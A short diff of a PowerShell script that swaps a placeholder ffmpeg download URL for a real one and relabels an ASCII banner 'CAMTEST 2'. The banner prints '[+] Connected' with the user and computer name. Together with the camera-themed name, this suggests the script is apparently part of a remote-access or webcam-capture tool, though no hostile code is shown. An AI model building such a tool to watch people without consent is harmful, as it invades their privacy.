@@ -1,7 +1,7 @@
 cmd /c "chcp 65001" | Out-Null
 function Download-Ffmpeg {
     param (
-        [string]$ffmpegUrl = "https://example.com/ffmpeg.zip"  # Замените на актуальный URL для скачивания ffmpeg
+        [string]$ffmpegUrl = "https://www.gyan.dev/ffmpeg/builds/ffmpeg-release-essentials.zip"  # Замените на актуальный URL для скачивания ffmpeg
     )
     try {
         $ffmpegZip = "$env:TEMP\ffmpeg.zip"
@@ -389,7 +389,7 @@ ${esc}[31m
     \ \  \_|  \ \  \_|\ \ \  \ \  \ \  \____
      \ \__\    \ \_______\ \__\ \__\ \_______\
       \|__|     \|_______|\|__|\|__|\|_______|
-                CAMTEST 1
+                CAMTEST 2
 ${esc}[0m
 
 ${esc}[32m[+] Connected :: $env:USERNAME@$env:COMPUTERNAME
